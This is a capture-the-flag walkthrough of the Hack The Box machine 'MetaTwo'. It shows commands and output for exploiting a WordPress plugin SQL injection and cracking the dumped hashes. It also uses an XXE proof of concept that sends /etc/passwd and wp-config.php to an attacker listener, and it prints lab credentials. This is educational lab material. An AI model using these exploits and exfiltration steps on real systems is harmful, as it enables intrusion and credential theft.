# Box: MetaTwo
# Level: Easy
# OS: Linux
<hr>

Lets get started

# Recon

## PortScanning

command:```sudo nmap -A 10.129.228.95 -v -p- -T4```

```
Nmap scan report for 10.129.228.95
Host is up (0.22s latency).
Not shown: 65520 closed tcp ports (reset)
PORT      STATE    SERVICE VERSION
21/tcp    open     ftp?
22/tcp    open     ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 c4:b4:46:17:d2:10:2d:8f:ec:1d:c9:27:fe:cd:79:ee (RSA)
|   256 2a:ea:2f:cb:23:e8:c5:29:40:9c:ab:86:6d:cd:44:11 (ECDSA)
|_  256 fd:78:c0:b0:e2:20:16:fa:05:0d:eb:d8:3f:12:a4:ab (ED25519)
80/tcp    open     http    nginx 1.18.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://metapress.htb/
|_http-server-header: nginx/1.18.0
5933/tcp  filtered unknown
6461/tcp  filtered unknown
19061/tcp filtered unknown
33358/tcp filtered unknown
35092/tcp filtered unknown
39024/tcp filtered unknown
43149/tcp filtered unknown
48221/tcp filtered unknown
49829/tcp filtered unknown
50148/tcp filtered unknown
51807/tcp filtered unknown
61662/tcp filtered unknown
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=11/3%OT=21%CT=1%CU=39353%PV=Y%DS=2%DC=T%G=Y%TM=65452EA
OS:4%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST1
OS:1NW7%O6=M53CST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Uptime guess: 2.283 days (since Wed Nov  1 11:44:07 2023)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3306/tcp)
HOP RTT       ADDRESS
1   219.79 ms 10.10.14.1
2   219.85 ms 10.129.228.95

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Nov  3 18:32:21 2023 -- 1 IP address (1 host up) scanned in 1083.61 seconds
```
From our nmap scan we have 3 open ports, port 21 which runs ftp, port 22 which runs ssh and port 80 which runs http. We'll begin our enumeration today from port 21.



# Enumeration (Port 21)

Lets connect to the ftp server with anonymous login

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2f5531f2-d127-4e1b-b73a-be3969838d44)

oops, anonymous login now allowed.

There's not much to do here, lets move our enumeration to port 80


# Enumeration (Port 80)

Navigate to the webpage

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/56f533a2-04c3-4dab-ab6d-dac098d5ee7a)

We'll add that domain name to our ```/etc/hosts``` file, then try to load the webpage again

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/02be7144-38e9-43c2-ba0d-b591152d54fc)

This is a wordpress site

lets fireup our wpscan tool to help us enumerate this webpage for plugins

command:```wpscan --url http://metapress.htb --plugins-detection aggressive -t 60```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/6e2f9e52-ca78-4a75-bb88-c1fb1977f00b)

We found 3 plugins, the version for the plugin ```bookingpress-appointment-booking``` actually has a public exploit

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/afdc3fc7-ae76-49fc-83ed-a1bc30ff52e1)

Lets exploit this




# Exploitation (port 80)

You can download the exploit we'll be using [here](https://github.com/destr4ct/CVE-2022-0739/blob/main/booking-press-expl.py)

Running the exploit

```
┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/metatwo]
└─$ python booking-press-expl.py                                       
- BookingPress PoC
usage: booking-press-expl.py [-h] -u URL -n NONCE
booking-press-expl.py: error: the following arguments are required: -u/--url, -n/--nonce
```
We need to provide the arguments ```--url``` and ```--nonce```, we have the url, but how do we get the nonce??

Navigate to the ```/events``` directory

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/a23e6c33-5eba-4842-9b61-f85fba12f1dd)

Lets view the page source

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/3e3e5933-82e2-4203-b96a-edf36371f374)

nice nice, we found the nonce, now lets run the exploit again

command:```python booking-press-expl.py -u http://metapress.htb/ -n 2e8c753422```

```
┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/metatwo]
└─$ python booking-press-expl.py -u http://metapress.htb/ -n 2e8c753422
- BookingPress PoC
-- Got db fingerprint:  10.5.15-MariaDB-0+deb11u1
-- Count of users:  2
|admin|admin@metapress.htb|$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.|
|manager|manager@metapress.htb|$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70|
```
Exploiting the SQLi, we were able to dump the db. Lets crack these hashes using john.

Save the hashes in a file say "hash", then we'll use john

command:```john hash --wordlist=/usr/share/wordlists/rockyou.txt```

```
┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/metatwo]
└─$ gedit hash            
                                                                                                                                                                                                                                             
┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/metatwo]
└─$ cat hash             
admin:$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.
manager:$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70
                                                                                                                                                                                                                                             
┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/metatwo]
└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
partylikearockstar (manager)     
1g 0:00:09:29 DONE (2023-11-05 14:07) 0.001754g/s 25168p/s 25363c/s 25363C/s !!!@@@!!!..*7¡Vamos!
Use the "--show --format=phpass" options to display all of the cracked passwords reliably
Session completed. 
```

Lets login with the creds

username:```manager```        password:```partylikearockstar```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/3f77ff3a-dc63-455b-94d8-c6860a8cc74f)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/cc06e7e4-5bbc-4053-a229-900f59ef4a52)

We are logged in

Doing my research I found out that the media library for this wordpress version actually has a public exploit

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/92c04fdb-a55e-4d87-9230-43139f1b3fe0)

You can download the exploit we'll be using from [here](https://github.com/0xRar/CVE-2021-29447-PoC)

To run this exploit, you have to provide your lhost, the port you want to listen on and also the file you want to read

command:```python PoC.py -l 10.10.14.153 -p 1234 -f /etc/passwd```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/964d438f-edad-4b37-9fc9-9c91709c67c0)

A ```payload.wav``` file was created in the same directory as the exploit when we ran it. So, what we'll do is upload the ```payload.wav``` fike, doing that should give us something on our listener

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/3e166931-6e9b-4c90-ba59-f75a6a4a0572)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/548de113-b78c-4f4f-ae8b-09f939d794ec)

Checking our terminal

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/81b7b032-cd89-47cf-8c2f-ad4f833fb4fc)

We got something that looks like base4, we can decode that using the php script below

```php
<?php
echo zlib_decode(base64_decode('base64_here'));
?>
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/cee5b0e3-f8fd-4ec9-866d-f19b1e6c3267)

nice nice, we can read the ```/etc/passwd``` file.

Using wappalyzer you'll see that it’s a nginx server, we can check the default file structure and receive it’s config first. (etc/nginx/nginx.conf)

command:```python PoC.py -l 10.10.14.153 -p 1234 -f /etc/nginx/sites-enabled/default```

Uploading the payload.wav file should get you this

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2950fc21-de73-4308-84a4-478011aebee6)

Decoding this

```
┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/metatwo]
└─$ gedit decode.php 
                                                                                                                                                                                                                                             
┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/metatwo]
└─$ php decode.php
server {

        listen 80;
        listen [::]:80;

        root /var/www/metapress.htb/blog;

        index index.php index.html;

        if ($http_host != "metapress.htb") {
                rewrite ^ http://metapress.htb/;
        }

        location / {
                try_files $uri $uri/ /index.php?$args;
        }
    
        location ~ \.php$ {
                include snippets/fastcgi-php.conf;
                fastcgi_pass unix:/var/run/php/php8.0-fpm.sock;
        }

        location ~* \.(js|css|png|jpg|jpeg|gif|ico|svg)$ {
                expires max;
                log_not_found off;
        }

}
```
We can see the base directory to be ```/var/www/metapress.htb/blog```, knowing this we can try to read the ```wp-config.php``` file

command:```python PoC.py -l 10.10.14.153 -p 1234 -f /var/www/metapress.htb/blog/wp-config.php```

You should get this when you upload the payload.wav file

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/6df13a04-b472-466d-82fb-36890a2fafe4)

Decoding this,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/0e12933b-43d0-4446-b206-dc75d759b3ca)

We foumd ftp creds, lets login to the ftp server with this

# Enumeration (Port 21)

username:```metapress.htb```      password:```9NYS_ii@FyL_p5M2NvJ```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/291709a7-1f2f-43ce-b9c9-809a73feda59)

We are in😎

In the ```mailer``` directory there's a file ```send_email.php```, download this file to your machine using the ```get``` command

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/0118634e-8859-40e4-8791-2ae547e2177b)

Lets view the file we downloaded

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/4c57ef69-5ee2-4be3-b374-33f11fda38b5)

nice nice, we found creds for user ```jnelson```, lets ssh into the server using this

username:```jnelson```       password:```Cb4_JmWM8zUZWMu@Ys```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/031a3a0c-b1d9-424c-8584-bd73847a1edc)

We are in😎. Lets go ahead to escalate our privileges



# Privilege Escalation

In the user home directory there's a password manager software ```passpie```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2eca352d-338f-40d9-8604-17039f0a7451)

Checking the content of the ```.key``` file in the directory you'll find a gpg private and public key

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/d905d7c2-2fe6-484c-94fc-d01319504ae4)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/8d88407b-d070-49fb-982e-8228f2bcd46b)

Save the private key in a file say "key", then we'll try to get the passphrase using john

commands
```
gpg2john key > bankai
john bankai --wordlist=/usr/share/wordlists/rockyou.txt
```

```
┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/metatwo]
└─$ gedit key
                                                                                                                                                                                                                                             
┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/metatwo]
└─$ gpg2john key > bankai

File key
                                                                                                                                                                                                                                             
┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/metatwo]
└─$ john bankai --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65011712 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 7 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
blink182         (Passpie)     
1g 0:00:00:05 DONE (2023-11-05 16:23) 0.1945g/s 32.68p/s 32.68c/s 32.68C/s ginger..987654
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
We got the passphrase to be ```blink182```

Now, lets export the passpie database

command
```
passpie list
touch vawulence
passpie export vawulence
cat vawulence
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/88e4a592-7219-4a7e-9558-da3e7880e821)

We were to get the root password.

Lets switch user 

username:```root```        password:```p7qfAZt4_A1xo_0x```

command:```su root```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/86570d5c-bb3b-4916-b7c1-3e43fad5d26a)

We have successfully pwned this box


That will be all for today
<br><br>
[Back To Home](../../index.md)




























